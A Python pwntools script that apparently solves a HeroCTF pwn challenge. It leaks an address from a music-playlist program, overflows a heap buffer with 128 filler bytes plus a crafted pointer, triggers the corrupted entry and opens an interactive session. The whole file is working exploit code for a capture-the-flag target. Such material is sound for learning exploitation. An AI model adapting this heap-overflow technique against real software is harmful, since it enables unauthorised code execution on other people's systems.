from pwn import *

p = connect("pwn.heroctf.fr", 6000)

p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b"(y/n): ")
p.sendline(b"y")

p.recvuntil(b"Enter music title: ")
p.sendline(b"Heap")

p.recvuntil(b"Enter music artist: ")
p.sendline(b"Overflow")

p.recvuntil(b"Enter music description: ")
p.sendline(b"Nothing")

p.recvuntil(b">> ")
p.sendline(b"4")

lol = p.recvuntil(b">> ")
start_addr = lol.decode().split("(song: ")[1].split(")")[0][:-3]
p.sendline(b"1")

p.recvuntil(b"(y/n): ")
p.sendline(b"y")

p.recvuntil(b"Enter music title: ")
p.sendline(b"Heap")

p.recvuntil(b"Enter music artist: ")
p.sendline(b"Overflow")

payload = b"A" * 128 + bytes.fromhex(start_addr[2:] + "1f9")[::-1]
log.info(f"Payload: {payload}")
p.recvuntil(b"Enter music description: ")
p.sendline(payload)

p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b"(y/n): ")
p.sendline(b"n")

p.recvuntil(b"Enter music title: ")
p.sendline(b"Heap")

p.recvuntil(b"Enter music artist: ")
p.sendline(b"Overflow")

p.recvuntil(b"Enter music description: ")
p.sendline(b"Nothing")

p.recvuntil(b">> ")
p.sendline(b"4")

print(p.recvuntil(b">> "))
p.sendline(b"2")

p.recvuntil(b"index: ")
p.sendline(b"2")

p.interactive()
